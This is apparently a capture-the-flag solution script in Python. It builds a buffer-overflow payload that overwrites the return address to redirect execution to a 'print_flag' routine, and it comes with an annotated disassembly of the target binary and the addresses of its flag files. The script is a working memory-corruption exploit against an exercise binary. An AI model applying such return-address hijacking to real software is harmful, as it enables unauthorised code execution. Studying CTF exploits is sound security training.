#!/usr/bin/env python3

i = 4 
pad0 = 'A'*i + 'B'*i                        # 41 42
pad1 = 'C'*i + 'D'*i                        # 43 44
rip = '\x2a\x10\x40\x00\x00\x00\x00\x00'    # change rip to mirror
link = '\x06\x20\x40\x00\x00\x00\x00\x00' +'\x00\x20\x40\x00\x00\x00\x00\x00'
pad2 = 'E'*i + 'F'*i                         # 45 46
pad3 = 'A'*i + 'B'*i + '\x3d\x10\x40\x00\x00\x00\x00\x00'  # change rip to print flag
pad4 = 'E'*(85 -len(pad0)- len(pad1) - len(rip) -len(link)-len(pad2) - len(pad3)) #53
buff = pad0 + pad1 + rip + link + pad2 + pad3 + pad4
print(buff)

"""

objdump
401000 <mirror>:  
    40101d:	0f 05                	syscall 				// read
    40101f:	48 89 c2             	mov    %rax,%rdx		// value of return(len) 
    401022:	b8 01 00 00 00       	mov    $0x1,%eax		// 1 - write
    401027:	54                   	push   %rsp							
    401028:	6a 01                	push   $0x1				
    40102a:	5f                   	pop    %rdi				// data (arg0)
    40102b:	5e                   	pop    %rsi				// buffer (arg1)
    40102c:	0f 05                	syscall 				// write(arg0,arg1)
    40102e:	48 03 24 25 0f 20 40 	add    0x40200f,%rsp	// flag.txt	
    401035:	00 
    401036:	48 83 fa 55          	cmp    $0x55,%rdx		// 86 - link (87 unlink)

040103d <print_flag>:
    40103d:	b8 02 00 00 00       	mov    $0x2,%eax		// 2 - open - skip
    
    
    402000   flase_flag.txt      '\x00\x20\x40\x00\x00\x00\x00\x00'
    40200f   flag.txt            '\x0f\x20\x40\x00\x00\x00\x00\x00'
    
    
    """